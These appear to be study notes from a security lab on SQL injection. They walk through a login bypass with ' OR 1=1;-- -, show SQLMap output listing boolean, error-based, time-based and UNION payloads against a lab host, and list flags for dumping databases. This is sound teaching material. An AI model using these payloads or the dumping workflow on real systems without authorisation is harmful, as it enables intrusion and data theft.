**==`Normal USER :`==**

Let’s take an example of a login page that asks you to enter your username and password to log in. Let’s provide it with the following data:

`Username: John`

`Password: Un@detectable444`

Once you enter your username and password, the website will receive it, make an SQL query with your credentials, and send it to the database. 

```php
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

**==`Attacker :`==**

`Username: John`

`Password: abc' OR 1=1;-- -`

This time, the attacker typed a random string `abc` and an injected string `' OR 1=1;-- -`. The SQL query that the website would send to the database will now become the following:

```php
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

---
### Why this works

In SQL, **operator precedence matters**:  `AND` is evaluated **before** `OR`
  
So the query is interpreted as:

```sql
(username = 'John' AND password = 'abc') OR 1=1
```

Now evaluate it:

```sql
username = 'John' AND password = 'abc' → false (password is wrong)
OR 1=1 → true
```

Since **one side of the OR is true**, the entire `WHERE` clause becomes true.

👉 Result: **the query returns rows**, and the application thinks authentication succeeded.

### Why the single quote `'` is crucial

Without the quote, SQL would treat the entire string as the password value, which would **not break out of the string literal**, and the attack would fail.

```sql
abc OR 1=1;-- -
```

With the quote:

```sql
'abc' OR 1=1 -- -
```

The attacker:

1. Properly closes the password string
2. Injects a new logical condition
3. Comments out the trailing `'` added by the application

That’s what makes the injection syntactically valid.

---
#### ==`Automated SQL Injection`==

SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying these vulnerabilities.

==`sqlmap --wizard`==

![[Pasted image 20260123225041.png]]

### SQLMap Commands (Organized)

**Target**

- `-u` → Specify target URL (GET-based testing)

The first step is to look for a possible vulnerable URL or request. You may often come across some URLs that use GET parameters to retrieve the data. For example, a URL like `http://sqlmaptesting.thm/search?cat=1` uses a parameter `cat` that takes the value `1`. If you see any web application using GET parameters in the URLs to retrieve data, you can test that URL with the -u flag in the SQLMap tool. This is considered to be HTTP GET-based testing. This approach is followed when the application uses GET parameters in the URL to retrieve data from the searches.

```
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 __H__ ___ ___[']_____ ___ ___ {1.2.4#stable} |_ -| . [,] | .'| . | |___|_ [(]_|_|_|__,| _| |_|V |_| http://sqlmap.org [text removed] [08:43:49] [INFO] testing connection to the target URL [08:43:49] [INFO] heuristics detected web page charset 'ascii' [08:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS [08:43:49] [INFO] testing if the target URL content is stable [08:43:50] [INFO] target URL content is stable [08:43:50] [INFO] testing if GET parameter 'cat' is dynamic [text removed] [08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable [text removed] [08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests: --- Parameter: cat (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: cat=1 AND 2175=2175 Type: error-based Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE) Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71)) Type: AND/OR time-based blind Title: MySQL >= 5.0.12 AND time-based blind Payload: cat=1 AND SLEEP(5) Type: UNION query Title: Generic UNION query (NULL) - 11 columns Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,0x714d486661414f6456787a4a55796b6c7a78574f7858507a6e6a725647436e64496f4965794c6873,0x7170766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HMgq --- [08:45:16] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu web application technology: Nginx, PHP 5.6.40 back-end DBMS: MySQL >= 5.1 [text removed]
```



**Session Handling**

- `--cookie` → Use authenticated session cookies


**Database Enumeration**

- `--dbs` → List database names

- `-D <db> --tables` → List tables in a database

- `-D <db> -T <table> --columns` → List columns in a table




**Data Extraction**

- `-D <db> -T <table> --dump` → Dump table records